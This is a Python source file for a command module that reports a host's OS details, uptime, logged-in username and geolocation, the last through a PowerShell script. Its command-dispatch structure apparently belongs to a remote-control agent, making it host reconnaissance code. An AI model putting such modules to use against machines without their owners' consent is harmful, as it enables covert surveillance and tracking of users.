from datetime import timedelta
from typing import Callable, Dict

import psutil
from ..constants import *
from ..scripting_interface import *
from ...scripts.powershell_scripts.system import geoLocate
from ..commands import Command, CommandArgs, ICommandModule, CommandResult
import ctypes
    
command_arg_map = {
    Command.GET_SYSTEM_INFO: None,
    Command.GET_UPTIME: None,
    Command.GET_USERNAME: None,
    Command.GEO_LOCATE: None,
}

class SysInfo(ICommandModule):
    @staticmethod
    def get_system_info() -> CommandResult:
        try:
            info = {
                "OS": platform.system(),
                "OS Version": platform.version(),
                "OS Release": platform.release(),
                "Architecture": platform.machine(),
                "Processor": platform.processor(),
                "CPU Count": str(psutil.cpu_count(logical=True)),
                "Physical CPU Count": str(psutil.cpu_count(logical=False)),
                "Total Memory": f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
            }

            if platform.system() == "Windows":
                info["Node Name"] = platform.node()
            else:
                info["Hostname"] = platform.node()
                info["Kernel"] = platform.uname().version

            return CommandResult(success=True, result=info)
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    @staticmethod
    def get_uptime() -> CommandResult:
        try:
            if platform.system() == "Windows":
                lib = ctypes.windll.kernel32
                t = lib.GetTickCount64()
                t = timedelta(milliseconds=int(str(t)))
            else:
                with open('/proc/uptime', 'r') as f:
                    uptime_seconds = float(f.readline().split()[0])
                    t = timedelta(seconds=uptime_seconds)
            return CommandResult(success=True, result={"seconds" : t.total_seconds()})
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    @staticmethod
    def get_username() -> CommandResult:
        try:
            return CommandResult(success=True, result=os.getlogin())
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    @staticmethod
    def geo_locate() -> CommandResult:
        try:
            if platform.system() == "Linux":
                return CommandResult(success=False, result="Geolocation is not supported on Linux through this method.")
            else:
                try:
                    data = execute_powershell_script(geoLocate, True)
                except subprocess.CalledProcessError:
                    return (0, 0)
                if "Denied" not in data:
                    coords = tuple(data.split("\n")[2].split(" "))
                    return CommandResult(success=True, result=coords)
                else:
                    return CommandResult(success=False, result="Geolocation not found.")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def run(self, command: Command, args: CommandArgs = None) -> CommandResult:
        command_func_map: Dict[Command, Callable[[], CommandResult]] = {
            Command.GET_SYSTEM_INFO: self.get_system_info,
            Command.GET_UPTIME: self.get_uptime,
            Command.GET_USERNAME: self.get_username,
            Command.GEO_LOCATE: self.geo_locate,
        }

        if command in command_func_map:
            try:
                return command_func_map[command]()
            except Exception as e:
                return CommandResult(success=False, result=f"Error executing {command}: {str(e)}")
        else:
            return CommandResult(success=False, result="Command not found in module.")